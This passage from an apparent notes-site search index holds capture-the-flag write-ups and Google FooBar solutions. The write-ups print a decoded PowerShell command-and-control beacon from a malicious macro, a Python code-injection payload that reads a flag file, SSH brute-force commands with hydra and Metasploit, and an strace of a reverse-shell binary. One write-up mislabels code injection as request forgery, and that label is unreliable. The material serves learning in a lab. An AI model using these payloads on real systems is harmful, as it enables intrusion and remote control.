done!\nH\n...\n```\n\nAnd on and on and on, which nobody has time to wait for.\n\nRunning `strings ouija` gives us a lot of output, but the most interesting part is the following:\n\n```log\nZLT{Svvafy_kdwwhk_lg_qgmj_ugvw_escwk_al_wskq_lg_ghlaearw_dslwj!}\n```\n\nThis is obviously the encoded flag, since it follows the same format as the other flags. We can try to use a [Caesar cipher](https://en.wikipedia.org/wiki/Caesar_cipher) to decode it. We can use [CyberChef](https://gchq.github.io/CyberChef/) to do this. We can use the `ROT13` recipe to decode the flag.\n\nAfter experimenting with the `ROT` recipe, we find the key that decodes the flag to the proper format, 8. That gives us the following flag:\n\n```text\nHTB{Adding_sleeps_to_your_code_makes_it_easy_to_optimize_later!}\n```\n","n":0.07}}},{"i":77,"$":{"0":{"v":"Ghost Wrangler","n":0.707},"1":{"v":"\nRunning `./ghost` gives us the following output:\n\n```log\n./ghost\n|                                       _| I've managed to trap the flag ghost in this box, but it's turned invisible!\nCan you figure out how to reveal them?\n```\n\nThe characters between the pipes are just `0x20`, so there's nothing of interest there.\n\nRunning `strings ghost` gives us a lot of output, but the most interesting part is the following, which is right above the string from the prompt:\n\n```log\nu/UH\n[]A\\A]A^A_\n[GQh{'f}g wLqjLg{ Lt{#`g&L#uLpgu&Lc'&g2n%s\n[4m%*.c\n[24m|\n```\n\nRunning magic on CyberChef with a depth of 5, intensive mode, and extensive language support showed us that the following operation returned the flag:\n\n```text\nXOR({'option':'Hex','string':'13'},'Standard',false)\n\nHTB{h4unt3d_by_th3_gh0st5_0f_ctf5_p45t!}\n```\n","n":0.104}}},{"i":78,"$":{"0":{"v":"ForensicHalloweenInvitation","n":1},"1":{"v":"\n- Ran `unzip ./invitation.docm` to view hidden contents of the Word document\n- `custom.xml` has a hex string `0x01010079F111ED35F8CC479449609E8A0923A6`, but decoding the string didn't give anything useful\n- Used `oletools` to extract macros from the document\n\n   ```bash\n    sudo pip3 install -U oletools\n    olevba -c ./invitation.docm > macros.log\n    ```\n\n    The contents of the log file can be found [here](./assets/hackthebox/HackTheBoo2022/ForensicHalloweenInvitation/macros.log).\n\n    The file yielded evidence that a hidden Powershell script would be executed when the document was opened (`AutoOpen`). The script opens a text file in the system temp directory, but I can't understand much more than that from the script because it has obviously been obfuscated.\n\n- Used [`ViperMonkey`](https://github.com/decalage2/ViperMonkey) to deobfuscate the script:\n\n    ```bash\n    wget https://raw.githubusercontent.com/decalage2/ViperMonkey/master/docker/dockermonkey.sh\n    chmod +x dockermonkey.sh\n    sudo ./dockermonkey.sh ./invitation.docm\n    ```\n\n    This returned a ZIP file containing `history.bak`, which had the following content:\n\n    ```base64\n    JABzAD0AJwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADAAJwA7ACQAaQA9ACcAZAA0ADMAYgBjAGMANgBkAC0AMAA0ADMAZgAyADQAMAA5AC0ANwBlAGEAMgAzAGEAMgBjACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvAGQANAAzAGIAYwBjADYAZAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AMAA0ADMAZgAyADQAMAA5ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AKQA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJABwACQAcwAvADcAZQBhADIAMwBhADIAYwAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0ASABUAEIAewA1AHUAcAAzAHIAXwAzADQANQB5AF8AbQA0AGMAcgAwADUAfQA=\n    ```\n\n    Interpreting that as base64 gave us the following:\n\n    ```text\n    $.s.=.'.7.7...7.4...1.9.8...5.2.:.8.0.8.0.'.;.$.i.=.'.d.4.3.b.c.c.6.d.-.0.4.3.f.2.4.0.9.-.7.e.a.2.3.a.2.c.'.;.$.p.=.'.h.t.t.p.:././.'.;.$.v.=.I.n.v.o.k.e.-.R.e.s.t.M.e.t.h.o.d. .-.U.s.e.B.a.s.i.c.P.a.r.s.i.n.g. .-.U.r.i. .$.p.$.s./.d.4.3.b.c.c.6.d. .-.H.e.a.d.e.r.s. .@.{.\".A.u.t.h.o.r.i.z.a.t.i.o.n.\".=.$.i.}.;.w.h.i.l.e. .(.$.t.r.u.e.).{.$.c.=.(.I.n.v.o.k.e.-.R.e.s.t.M.e.t.h.o.d. .-.U.s.e.B.a.s.i.c.P.a.r.s.i.n.g. .-.U.r.i. .$.p.$.s./.0.4.3.f.2.4.0.9. .-.H.e.a.d.e.r.s. .@.{.\".A.u.t.h.o.r.i.z.a.t.i.o.n.\".=.$.i.}.).;.i.f. .(.$.c. .-.n.e. .'.N.o.n.e.'.). .{.$.r.=.i.e.x. .$.c. .-.E.r.r.o.r.A.c.t.i.o.n. .S.t.o.p. .-.E.r.r.o.r.V.a.r.i.a.b.l.e. .e.;.$.r.=.O.u.t.-.S.t.r.i.n.g. .-.I.n.p.u.t.O.b.j.e.c.t. .$.r.;.$.t.=.I.n.v.o.k.e.-.R.e.s.t.M.e.t.h.o.d. .-.U.r.i. .$.p.$.s./.7.e.a.2.3.a.2.c. .-.M.e.t.h.o.d. .P.O.S.T. .-.H.e.a.d.e.r.s. .@.{.\".A.u.t.h.o.r.i.z.a.t.i.o.n.\".=.$.i.}. .-.B.o.d.y. .(.[.S.y.s.t.e.m...T.e.x.t...E.n.c.o.d.i.n.g.].:.:.U.T.F.8...G.e.t.B.y.t.e.s.(.$.e.+.$.r.). .-.j.o.i.n. .'. .'.).}. .s.l.e.e.p. .0...8.}.H.T.B.{.5.u.p.3.r._.3.4.5.y._.m.4.c.r.0.5.}.\n    ```\n\n    From that we were able to get the flag:\n\n    ```text\n    HTB{5up3r_345y_m4cr05}\n    ```\n\n## Resources\n\n- https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis\n- https://www.decalage.info/en/vba_emulation\n","n":0.072}}},{"i":79,"$":{"0":{"v":"Evaluation Deck","n":0.707},"1":{"v":"\n## Target Information\n\n- IP: `157.245.42.104:31254`\n- Game application with public API at `http://157.245.42.104:31254/api/get_health`\n  - Can interface with it via `curl`:\n      ```shell\n      curl -X POST -H \"Content-Type: application/json\" -d '{\"attack_power\":\"90\",\"current_health\":\"100\",\"operator\":\"+\"}' http://157.245.42.104:31254/api/get_health\n      ```\n- Running Docker\n\n## Exploitation\n\n- Opened the application in the Burp Suite proxy and sent a request to the API:\n\n    ```json\n    {\n      \"attack_power\": \"90\",\n      \"current_health\": \"100\",\n      \"operator\": \"+\"\n    }\n    ```\n\n    The response was:\n\n    ```json\n    {\n      \"message\": \"190\"\n    }\n    ```\n\n    This means that the API is vulnerable to a [server-side request forgery](https://portswigger.net/web-security/ssrf) attack.\n\n    The following lines in `routes.py` show that the API is vulnerable:\n\n    ```python\n    code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')\n    exec(code, result)\n    return response(result.get('result'))\n    ```\n\n- Attempted to use the API to access the flag on the Docker filesystem:\n\n    ```json\n    {\n      \"attack_power\": \"0\",\n      \"current_health\": \"0\",\n      \"operator\": \"+ int(''.join([str(ord(x)) for x in list(open('/flag.txt').read())])) +\"\n    }\n    ```\n\n    The response was:\n\n    ```json\n    {\n      \"message\": 728466123994810051954911010651991164948110115955211451957111451971163333125\n    }\n    ```\n\n    I converted this number from the Python `ord` positions of the flag to ASCII to get the flag:\n\n    ```text\n    HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}\n    ```\n\n## Final Thoughts\n\nA complete write-up of this challenge can be found on [Medium](https://medium.com/meese-enterprises/walkthrough-hack-the-boo-2022-evaluation-deck-challenge-8933e0b4b168), please check it out and show your support by leaving some claps and sharing it with your friends!\n\nThe files for this challenge can be found in the [assets folder](./assets/hackthebox/HackTheBoo2022/EvaluationDeck/) if you would like to try it out for yourself.\n","n":0.068}}},{"i":80,"$":{"0":{"v":"EncodedPayload","n":1},"1":{"v":"\nTried making the binary an executable and executing it:\n\n```shell\nchmod +x ./encodedpayload\n./encodedpayload\n```\n\nBut it silently failed. Running it with `strace` showed that it was trying to connect to localhost:\n\n```log\n$ strace ./encodedpayload\nexecve(\"./encodedpayload\", [\"./encodedpayload\"], 0x7ffd52e05a00 /* 84 vars */) = 0\nstrace: [ Process PID=479009 runs in 32 bit mode. ]\nsocket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3\ndup2(3, 2)                              = 2\ndup2(3, 1)                              = 1\ndup2(3, 0)                              = 0\nconnect(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr(\"127.0.0.1\")}, 102) = -1 ECONNREFUSED (Connection refused)\nsyscall_0xffffffffffffff0b(0xff907188, 0xff907180, 0, 0, 0, 0) = -1 ENOSYS (Function not implemented)\nexecve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"echo HTB{PLz_strace_M333}\"], NULL) = 0\nstrace: [ Process PID=479009 runs in 64 bit mode. ]\nbrk(NULL)                               = 0x56187162a000\narch_prctl(0x3001 /* ARCH_??? */, 0x7ffe62905c70) = -1 EINVAL (Invalid argument)\naccess(\"/etc/ld.so.preload\", R_OK)      = -1 ENOENT (No such file or directory)\nopenat(AT_FDCWD, \"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 4\nfstat(4, {st_mode=S_IFREG|0644, st_size=149062, ...}) = 0\nmmap(NULL, 149062, PROT_READ, MAP_PRIVATE, 4, 0) = 0x7f264331a000\nclose(4)                                = 0\nopenat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 4\nread(4, \"\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\300A\\2\\0\\0\\0\\0\\0\"..., 832) = 832\npread64(4, \"\\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0\"..., 784, 64) = 784\npread64(4, \"\\4\\0\\0\\0\\20\\0\\0\\0\\5\\0\\0\\0GNU\\0\\2\\0\\0\\300\\4\\0\\0\\0\\3\\0\\0\\0\\0\\0\\0\\0\", 32, 848) = 32\npread64(4, \"\\4\\0\\0\\0\\24\\0\\0\\0\\3\\0\\0\\0GNU\\0\\30x\\346\\264ur\\f|Q\\226\\236i\\253-'o\"..., 68, 880) = 68\nfstat(4, {st_mode=S_IFREG|0755, st_size=2029592, ...}) = 0\nmmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f2643318000\npread64(4, \"\\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0\"..., 784, 64) = 784\npread64(4, \"\\4\\0\\0\\0\\20\\0\\0\\0\\5\\0\\0\\0GNU\\0\\2\\0\\0\\300\\4\\0\\0\\0\\3\\0\\0\\0\\0\\0\\0\\0\", 32, 848) = 32\npread64(4, \"\\4\\0\\0\\0\\24\\0\\0\\0\\3\\0\\0\\0GNU\\0\\30x\\346\\264ur\\f|Q\\226\\236i\\253-'o\"..., 68, 880) = 68\nmmap(NULL, 2037344, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 4, 0) = 0x7f2643126000\nmmap(0x7f2643148000, 1540096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 4, 0x22000) = 0x7f2643148000\nmmap(0x7f26432c0000, 319488, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 4, 0x19a000) = 0x7f26432c0000\nmmap(0x7f264330e000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 4, 0x1e7000) = 0x7f264330e000\nmmap(0x7f2643314000, 13920, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f2643314000\nclose(4)                                = 0\narch_prctl(ARCH_SET_FS, 0x7f2643319580) = 0\nmprotect(0x7f264330e000, 16384, PROT_READ) = 0\nmprotect(0x56186fc4b000, 8192, PROT_READ) = 0\nmprotect(0x7f264336c000, 4096, PROT_READ) = 0\nmunmap(0x7f264331a000, 149062)          = 0\ngetuid()                                = 1000\ngetgid()                                = 1000\ngetpid()                                = 479009\nrt_sigaction(SIGCHLD, {sa_handler=0x56186fc40c30, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7f2643169090}, NULL, 8) = 0\ngeteuid()                               = 1000\ngetppid()                               = 479006\nbrk(NULL)                               = 0x56187162a000\nbrk(0x56187164b000)                     = 0x56187164b000\ngetcwd(\"/home/aaron/Downloads/HTB/rev_encodedpayload\", 4096) = 45\ngeteuid()                               = 1000\ngetegid()                               = 1000\nrt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0\nrt_sigaction(SIGINT, {sa_handler=0x56186fc40c30, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7f2643169090}, NULL, 8) = 0\nrt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0\nrt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7f2643169090}, NULL, 8) = 0\nrt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0\nrt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7f2643169090}, NULL, 8) = 0\nwrite(1, \"HTB{PLz_strace_M333}\\n\", 21)  = -1 EPIPE (Broken pipe)\n--- SIGPIPE {si_signo=SIGPIPE, si_code=SI_USER, si_pid=479009, si_uid=1000} ---\n+++ killed by SIGPIPE +++\n```\n\nAnd as you can see, the flag was `HTB{PLz_strace_M333}`.\n","n":0.054}}},{"i":81,"$":{"0":{"v":"Cult Meeting","n":0.707},"1":{"v":"\n## Target Information\n\n- IP: `46.101.82.173:30227`\n\n## Exploitation\n\n- Enumerated the target with `nmap`:\n\n    ```shell\n    nmap 46.101.82.173 -sC -sV -T4 -Pn\n    ```\n\n    It only returned that ports 31038 and 31337 were open.\n\n- Attempted to SSH into the given port:\n\n    ```shell\n    ssh -p 30227 46.101.82.173\n    ```\n\n    Returned the message:\n\n    ```text\n    Bad packet length 218766171.\n    ssh_dispatch_run_fatal: Connection to 46.101.82.173 port 30227: message authentication code incorrect\n    ```\n\n    The same thing when using `anonymous@46.101.82.173`.\n\n    Running in verbose mode returned the following:\n\n    ```log\n    OpenSSH_8.2p1 Ubuntu-4ubuntu0.5, OpenSSL 1.1.1f  31 Mar 2020\n    debug1: Reading configuration data /etc/ssh/ssh_config\n    debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files\n    debug1: /etc/ssh/ssh_config line 21: Applying options for *\n    debug1: Connecting to 46.101.82.173 [46.101.82.173] port 30227.\n    debug1: Connection established.\n    debug1: identity file /home/aaron/.ssh/id_rsa type -1\n    debug1: identity file /home/aaron/.ssh/id_rsa-cert type -1\n    debug1: identity file /home/aaron/.ssh/id_dsa type -1\n    debug1: identity file /home/aaron/.ssh/id_dsa-cert type -1\n    debug1: identity file /home/aaron/.ssh/id_ecdsa type -1\n    debug1: identity file /home/aaron/.ssh/id_ecdsa-cert type -1\n    debug1: identity file /home/aaron/.ssh/id_ecdsa_sk type -1\n    debug1: identity file /home/aaron/.ssh/id_ecdsa_sk-cert type -1\n    debug1: identity file /home/aaron/.ssh/id_ed25519 type -1\n    debug1: identity file /home/aaron/.ssh/id_ed25519-cert type -1\n    debug1: identity file /home/aaron/.ssh/id_ed25519_sk type -1\n    debug1: identity file /home/aaron/.ssh/id_ed25519_sk-cert type -1\n    debug1: identity file /home/aaron/.ssh/id_xmss type -1\n    debug1: identity file /home/aaron/.ssh/id_xmss-cert type -1\n    debug1: Local version string SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\n    debug1: Remote protocol version 2.0, remote software version OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\n    debug1: match: OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 pat OpenSSH* compat 0x04000000\n    debug1: Authenticating to 46.101.82.173:30227 as 'anonymous'\n    debug1: SSH2_MSG_KEXINIT sent\n    Bad packet length 218766171.\n    ssh_dispatch_run_fatal: Connection to 46.101.82.173 port 30227: message authentication code incorrect\n    ```\n\n    So we at least know that OpenSSH is running on the target.\n\n    The logs did highlight that at least one of the problems was that my OpenSSH install was trying to authenticate with my local `id_rsa` file, which obviously won't work. After conducting some research, [I determined](https://serverfault.com/q/493213/537331) that the issue could be solved by using a different command:\n\n    ```shell\n    ssh -p 30227 anonymous@46.101.82.173 -v -o PreferredAuthentications=password -o PubkeyAuthentication=no\n    ```\n\n    This yielded a much more promising set of logs:\n\n    ```log\n    debug1: kex_exchange_identification: banner line 0: \\033[3mYou knock on the door and a panel slides back\\033[0m\n    debug1: kex_exchange_identification: banner line 1: |/\\360\\237\\221\\201\\357\\270\\217 \\360\\237\\221\\201\\357\\270\\217 \\\\|\\033[3m A hooded figure looks out at you\\033[0m\n    debug1: kex_exchange_identification: banner line 2: \"What is the password for this week's meeting?\" SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\n    debug1: kex_exchange_identification: banner line 3:\n    debug1: kex_exchange_identification: banner line 4:    \\\\/\n    debug1: kex_exchange_identification: banner line 5: |/\\360\\237\\221\\201\\357\\270\\217 \\360\\237\\221\\201\\357\\270\\217 \\\\| \"That's not our password - call the guards!\"\n    kex_exchange_identification: Connection closed by remote host\n    ```\n\n- Attempted to brute force the password with `msfconsole`:\n\n    ```shell\n    msfconsole\n    ```\n\n    ```ruby\n    use auxiliary/scanner/ssh/ssh_login\n    set RHOSTS 46.101.82.173\n    set RPORT 30227\n    set PASS_FILE /usr/share/wordlists/rockyou.txt\n    set USERNAME anonymous\n    set STOP_ON_SUCCESS true\n    set VERBOSE true\n    run\n    ```\n\n    Unfortunately this was sporadically interrupted by the target closing the connection, and there is no setting to force `msfconsole` to keep trying. I opened an issue [here](https://github.com/rapid7/metasploit-framework/issues/17178) to request this feature, but it most certainly won't be implemented in time to help me with this challenge.\n\n- Attempted to brute force the password with `hydra`:\n\n    ```shell\n    hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ssh://46.101.82.173 -s 30227 -t 4\n    ```\n\n    Gave this error message: `[ERROR] could not connect to ssh://46.101.82.173:30227 - read_packet(): Packet len too high(218766171 d0a1b5b)`\n\n- Running `strings` on the file provided by HTB gave the password `sup3r_s3cr3t_p455w0rd_f0r_u!` thanks to the proximity to the messages displayed by the SSH server. Unfortunately this just SSH's us into our current directory, since it isn't running on the server.\n\n- Attached `edb_debugger` to the SSH password verification binary to determine what the password is being compared to.\n\n    ```shell\n    edb --run ./meeting\n    ```\n\n    Running a search for the password string shows that `/bin/sh` is ran if the password matches the proper memory address.\n\n- Using `telnet 46.101.82.173 30227` got me the same result as SSH, except this one was interactive and actually allowed me to enter the password.\n\n    Once I did that, the password I uncovered in the local binary (`sup3r_s3cr3t_p455w0rd_f0r_u!`) worked, and I was able to get a shell in the server.\n\n    Running `cat flag.txt` yielded the flag, `HTB{1nf1ltr4t1ng_4_cul7_0f_str1ng5}`.\n","n":0.039}}},{"i":82,"$":{"0":{"v":"Google FooBar","n":0.707}}},{"i":83,"$":{"0":{"v":"Please Pass the Coded Messages","n":0.447},"1":{"v":"\n## Instructions\n\nYou need to pass a message to the bunny workers, but to avoid detection, the code you agreed to use is... obscure, to say the least. The bunnies are given food on standard-issue plates that are stamped with the numbers 0-9 for easier sorting, and you need to combine sets of plates to create the numbers in the code. The signal that a number is part of the code is that it is divisible by 3. You can do smaller numbers like 15 and 45 easily, but bigger numbers like 144 and 414 are a little trickier. Write a program to help yourself quickly create large numbers for use in the code, given a limited number of plates to work with.\n\nYou have L, a list containing some digits (0 to 9). Write a function solution(L) which finds the largest number that can be made from some or all of these digits and is divisible by 3. If it is not possible to make such a number, return 0 as the solution. L will contain anywhere from 1 to 9 digits.  The same digit may appear multiple times in the list, but each element in the list may only be used once.\n\n### Languages\n\nTo provide a Java solution, edit `Solution.java`\n\nTo provide a Python solution, edit `solution.py`\n\n### Test cases\n\nYour code should pass the following test cases.\nNote that it may also be run against hidden test cases not shown here.\n\n-- Java cases --\n\nInput:\n`Solution.solution({3, 1, 4, 1})`\nOutput:\n    `4311`\n\nInput:\n`Solution.solution({3, 1, 4, 1, 5, 9})`\n\nOutput:\n    `94311`\n\n-- Python cases --\n\nInput:\n`solution.solution([3, 1, 4, 1])`\n\nOutput:\n    `4311`\n\nInput:\n`solution.solution([3, 1, 4, 1, 5, 9])`\n\nOutput:\n    `94311`\n\nUse `verify [file]` to test your solution and see how it does. When you are finished editing your code, use `submit [file]` to submit your answer. If your solution passes the test cases, it will be removed from your home folder.\n\n### Python\n\n```py\nimport itertools\n\ndef solution(nums):\n    for i in range(len(nums), 1, -1):\n        # Get all possible arrays that can be made from the given array\n        combinations = itertools.permutations(nums, i)\n\n        # Combine each array into a single number\n        combinations = [int(''.join(map(str, combination))) for combination in combinations]\n\n        # Filter to only those that are divisible by 3\n        divisible_by_3 = list(filter(lambda x: x % 3 == 0, combinations))\n\n        # If there are any, return the largest\n        if divisible_by_3:\n            return max(divisible_by_3)\n\n    return 0\n\n# Test cases\nprint(solution([3, 1, 4, 1])) # 4311\nprint(solution([3, 1, 4, 1, 5, 9])) # 94311\n```\n","n":0.05}}},{"i":84,"$":{"0":{"v":"Bringing a Gun to a Trainer Fight","n":0.378},"1":{"v":"\n## Instructions\n\nUh-oh -- you've been cornered by one of Commander Lambdas elite bunny trainers! Fortunately, you grabbed a beam weapon from an abandoned storeroom while you were running through the station, so you have a chance to fight your way out. But the beam weapon is potentially dangerous to you as well as to the bunny trainers: its beams reflect off walls, meaning you'll have to be very careful where you shoot to avoid bouncing a shot toward yourself!\n\nLuckily, the beams can only travel a certain maximum distance before becoming too weak to cause damage. You also know that if a beam hits a corner, it will bounce back in exactly the same direction. And of course, if the beam hits either you or the bunny trainer, it will stop immediately (albeit painfully).\n\nWrite a function solution(dimensions, your_position, trainer_position, distance) that gives an array of 2 integers of the width and height of the room, an array of 2 integers of your x and y coordinates in the room, an array of 2 integers of the trainer's x and y coordinates in the room, and returns an integer of the number of distinct directions that you can fire to hit the elite trainer, given the maximum distance that the beam can travel.\n\nThe room has integer dimensions [1 < x_dim <= 1250, 1 < y_dim <= 1250]. You and the elite trainer are both positioned on the integer lattice at different distinct positions (x, y) inside the room such that [0 < x < x_dim, 0 < y < y_dim]. Finally, the maximum distance that the beam can travel before becoming harmless will be given as an integer 1 < distance <= 10000.\n\nFor example, if you and the elite trainer were positioned in a room with dimensions [3, 2], your_position [1, 1], trainer_position [2, 1], and a maximum shot distance of 4, you could shoot in seven different directions to hit the elite trainer (given as vector bearings from your location): [1, 0], [1, 2], [1, -2], [3, 2], [3, -2], [-3, 2], and [-3, -2]. As specific examples, the shot at bearing [1, 0] is the straight line horizontal shot of distance 1, the shot at bearing [-3, -2] bounces off the left wall and then the bottom wall before hitting the elite trainer with a total shot distance of sqrt(13), and the shot at bearing [1, 2] bounces off just the top wall before hitting the elite trainer with a total shot distance of sqrt(5).\n\n### Test cases\n\nYour code should pass the following test cases.\n\nNote that it may also be run against hidden test cases not shown here.\n\nInput:\n`solution.solution([3,2], [1,1], [2,1], 4)`\nOutput:\n    `7`\n\nInput:\n`solution.solution([300,275], [150,150], [185,100], 500)`\nOutput:\n    `9`\n\n### Thought Process\n\n- If the absolute distance between the shooter and the target is greater than the maximum distance, the shot will not hit the target (`solution = 0`).\n  - If the absolute distance between the shooter and the target is equal to the maximum distance, the shot will hit the target and only one shot is possible (`solution = 1`).\n- The shots in the example are vectors relative to the shooter's position, not absolute coordinates in the room.\n  - Angles can be used to represent the shot direction, using the sides of a triangle with the shooter's position as the origin.\n  - The angle of a shot can be calculated using `atan2(y, x)`.\n\n## Python\n\n```py\nfrom itertools import product\nfrom math import atan2\n\n# Props to some of the visuals by Peter Agalakov and some syntax from\n# Jason Lavoie (courtesy of Copilot)\ndef solution(dimensions, your_position, trainer_position, distance):\n    \"\"\"\n    INPUT:\n    - dimensions: list of two integers [x, y] representing the width and height\n    of the room\n    - your_position: list of two integers [x, y] representing your x and y\n    coordinates in the room\n    - trainer_position: list of two integers [x, y] representing the trainer's\n    x and y coordinates in the room\n    - distance: integer representing the maximum distance the beam can travel\n    OUTPUT:\n    - int: maximum number of distinct directions that you can fire to hit the\n    trainer, given the maximum distance that the beam can travel\n    \"\"\"\n\n    max_distance = distance\n    shooter_x, shooter_y = your_position\n    hits = dict()\n\n    # Generates the matrix of points that will need to be reflected into the\n    # other quadrants; the strange range logic is required because the constraints\n    # specify Python 2.7, which doesn't play nicely with range() and floats\n    for reflect in product(*[range(-(max_distance // -d) + 1) for d in dimensions]):\n        # Finds all hits for the shooter and the trainer\n        for position in your_position, trainer_position:\n            # Generates the four reflection quadrants of the room\n            for quadrant in [(1, 1), (-1, 1), (-1, -1), (1, -1)]:\n                x, y = [\n                  # Mirrors odd-numbered reflections across the y-axis\n                  (d * r + (d - p if r % 2 else p)) * q\n                  for d, p, r, q in zip(dimensions, position, reflect, quadrant)\n                ]\n                # Calculates the distance from the shooter to the hit\n                distance = (abs(x - shooter_x) ** 2 + abs(y - shooter_y) ** 2) ** 0.5\n                # Calculates the angle from the shooter to the hit\n                angle = atan2(shooter_x - x, shooter_y - y)\n                # Ignores hits that are out of range or have already been\n                # recorded at a shorter distance\n                if distance > max_distance or (angle in hits and distance > abs(hits[angle])):\n                    continue\n\n                # Mark shooter hits (bad) with a negative distance and trainer\n                # hits (good) with a positive distance\n                hits[angle] = distance * (-1 if position == your_position else 1)\n\n    # Returns the number of distinct angles that hit the trainer\n    return len([1 for travel in hits.values() if travel > 0])\n\n\n# Test cases\nprint(solution([3, 2], [1, 1], [2, 1], 1)) # 1\nprint(solution([3, 2], [1, 1], [2, 1], 0)) # 0\nprint(solution([3, 2], [1, 1], [2, 1], 4)) # 7\nprint(solution([23, 10], [6, 4], [3, 2], 23)) # 8\nprint(solution([300, 275], [150, 150], [185, 100], 500)) # 9\nprint(solution([2, 5], [1, 2], [1, 4], 11)) # 27\n```\n","n":0.032}}},{"i":85,"$":{"0":{"v":"Fuel Injection Perfection","n":0.577},"1":{"v":"\n## Instructions\n\n> Commander Lambda has asked for your help to refine the automatic quantum antimatter fuel injection system for the LAMBCHOP doomsday device. It's a great chance for you to get a closer look at the LAMBCHOP -- and maybe sneak in a bit of sabotage while you're at it -- so you took the job gladly.\n\nQuantum antimatter fuel comes in small pellets, which is convenient since the many moving parts of the LAMBCHOP each need to be fed fuel one pellet at a time. However, minions dump pellets in bulk into the fuel intake. You need to figure out the most efficient way to sort and shift the pellets down to a single pellet at a time.\n\nThe fuel control mechanisms have three operations:\n\n1. Add one fuel pellet\n2. Remove one fuel pellet\n3. Divide the entire group of fuel pellets by 2 (due to the destructive energy released when a quantum antimatter pellet is cut in half, the safety controls will only allow this to happen if there is an even number of pellets)\n\nWrite a function called solution(n) which takes a positive integer as a string and returns the minimum number of operations needed to transform the number of pellets to 1. The fuel intake control panel can only display a number up to 309 digits long, so there won't ever be more pellets than you can express in that many digits.\n\nFor example:\n\n```text\nsolution(4) returns 2: 4 -> 2 -> 1\nsolution(15) returns 5: 15 -> 16 -> 8 -> 4 -> 2 -> 1\n```\n\n### Languages\n\nTo provide a Python solution, edit `solution.py`\n\nTo provide a Java solution, edit `Solution.java`\n\n### Test cases\n\nYour code should pass the following test cases.\n\nNote that it may also be 